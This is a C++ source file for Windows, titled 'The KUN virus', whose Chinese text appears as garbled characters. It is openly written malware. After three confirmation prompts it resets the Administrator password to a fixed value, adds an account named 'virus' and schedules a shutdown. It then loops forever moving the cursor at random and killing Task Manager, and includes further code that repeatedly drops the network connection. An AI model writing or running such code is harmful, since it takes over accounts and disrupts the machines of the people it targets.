#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	system("title Tiwers OS ----The KUN virus [version:0.3.0]");
	system("color a");
	char da;
	cout<<"Tinwers OS ---- The KUN virus [version:0.3.0]"<<endl;
	cout<<"(c) SUNNY BLANK����������Ȩ����"<<endl<<endl;
	cout<<"������ʹ�ñ����Բ���,�Ͻ��Ƿ�ʹ��!"<<endl;
	cout<<"������ʹ�ñ����Բ���,�Ͻ��Ƿ�ʹ��!"<<endl;
	cout<<"������ʹ�ñ����Բ���,�Ͻ��Ƿ�ʹ��!"<<endl<<endl;
	cout<<"�Ƿ�ȷ��ʹ�ñ����Բ�����[T/F] ";
	cin>>da;
	if(da=='T'||da=='t'){
		cout<<"�Ƿ�ȷ��ʹ�ñ����Բ���?(�ٴ�ȷ��) [T/F] ";
		cin>>da;
		if(da=='T'||da=='t'){
			cout<<"�Ƿ�ȷ��ʹ�ñ����Բ���?(���ȷ��) [T/F] ";
			cin>>da;
			if(da=='T'||da=='t'){
				cout<<"�޸������С���������";
				char k='Y';
				if(k=='Y') system("net user Administrator n1y2b3g4j");//�û���������Ϊn1y2b3g4j
				system("net user virus wait /add");//�û�������Ϊvirus
				cout<<"30���ػ�����������";
				k='Y';
				if(k=='Y') system("shutdown -s -t 30");//30���ػ�
				int x=GetSystemMetrics(SM_CXSCREEN);//get���x��
  				int y=GetSystemMetrics(SM_CYSCREEN);//get���y��
				cout<<"��������С���������";
				k='Y';
				if(k=='Y') {
					while(1){
						SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
						system("taskkill /f /im taskmgr.exe");//��ֹ����������������ã�
					}	
				}
				HWND hwnd;
				hwnd = FindWindow("ConsoleWindowClass", NULL);
				if (hwnd){
					ShowWindow(hwnd, SW_HIDE);
				}
				MessageBox(NULL, "���ڶϿ�����", "����", MB_OK + MB_ICONWARNING);
				while (true){
					system("ipconfig /release"); //�Ͽ�����
				}
			} 
		}
	}
	
}

	
 
